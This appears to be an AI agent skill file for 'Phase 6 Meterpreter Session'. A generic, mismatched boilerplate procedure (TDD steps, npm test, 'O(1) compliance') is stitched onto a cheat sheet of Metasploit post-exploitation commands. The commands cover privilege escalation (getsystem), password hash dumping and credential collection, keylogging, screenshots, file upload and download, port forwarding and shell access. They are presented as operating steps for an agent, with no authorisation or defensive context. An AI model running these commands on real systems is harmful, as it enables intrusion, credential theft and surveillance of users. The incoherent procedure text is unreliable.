---
name: phase-6-meterpreter-session
description: Use when executing phase 6 meterpreter session protocols within the security sector.
---

# Phase 6 Meterpreter Session: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Phase 6 Meterpreter Session. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core phase 6 meterpreter session logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Phase 6: Meterpreter Session

Work with Meterpreter post-exploitation:

```bash
# After successful exploitation, you get Meterpreter prompt
meterpreter >

# System Information
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# File System Operations
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users
meterpreter > download file.txt /tmp/
meterpreter > upload /tmp/tool.exe C:\\

# Process Management
meterpreter > ps
meterpreter > migrate [PID]
meterpreter > kill [PID]

# Networking
meterpreter > ipconfig
meterpreter > netstat
meterpreter > route
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1

# Privilege Escalation
meterpreter > getsystem
meterpreter > getprivs

# Credential Harvesting
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/credential_collector

# Screenshots and Keylogging
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Shell Access
meterpreter > shell
C:\Windows\system32> whoami
C:\Windows\system32> exit
meterpreter >

# Background Session
meterpreter > background
msf6 exploit(...) > sessions -l
msf6 exploit(...) > sessions -i 1
```